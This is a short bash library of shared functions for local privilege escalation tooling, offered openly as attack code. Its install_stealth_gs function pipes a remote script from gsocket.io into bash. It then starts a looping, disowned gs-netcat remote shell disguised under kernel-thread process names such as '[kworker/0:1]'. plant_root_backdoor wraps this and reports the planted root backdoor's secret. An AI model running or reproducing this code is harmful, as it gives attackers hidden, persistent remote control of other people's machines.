#!/bin/bash
# Common functions for LPE methods

info()  { echo "[*] $1"; }
success() { echo "[+] $1"; }
fail()  { echo "[-] $1"; }
warn()  { echo "[!] $1"; }

# Install stealth GSSocket backdoor as current user
install_stealth_gs() {
    local secret="${1:-$(head -c 16 /dev/urandom | xxd -p | head -c 16)}"
    
    # Install gs-netcat if needed
    if ! command -v gs-netcat >/dev/null 2>&1; then
        curl -sSL gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1 || \
        wget -qO- gsocket.io/y 2>/dev/null | bash >/dev/null 2>&1
    fi
    
    command -v gs-netcat >/dev/null 2>&1 || return 1
    
    # Disguised process names
    local names=("[kworker/0:1]" "[watchdog/0]" "[migration/0]" "[ksoftirqd/0]" "[rcu_sched]")
    local name="${names[$((RANDOM % ${#names[@]}))]}"
    
    # Start with disguised name, using sh to avoid .bashrc traps
    (
        while true; do
            exec -a "$name" gs-netcat -s "$secret" -l -e "/bin/sh --norc --noprofile" >/dev/null 2>&1
            sleep $((5 + RANDOM % 10))
        done
    ) &
    disown
    
    echo "$secret"
}

# Plant root backdoor
plant_root_backdoor() {
    local secret
    secret=$(install_stealth_gs)
    if [ -n "$secret" ]; then
        success "ROOT BACKDOOR PLANTED!"
        echo "ROOT_SECRET:$secret"
        return 0
    fi
    return 1
}
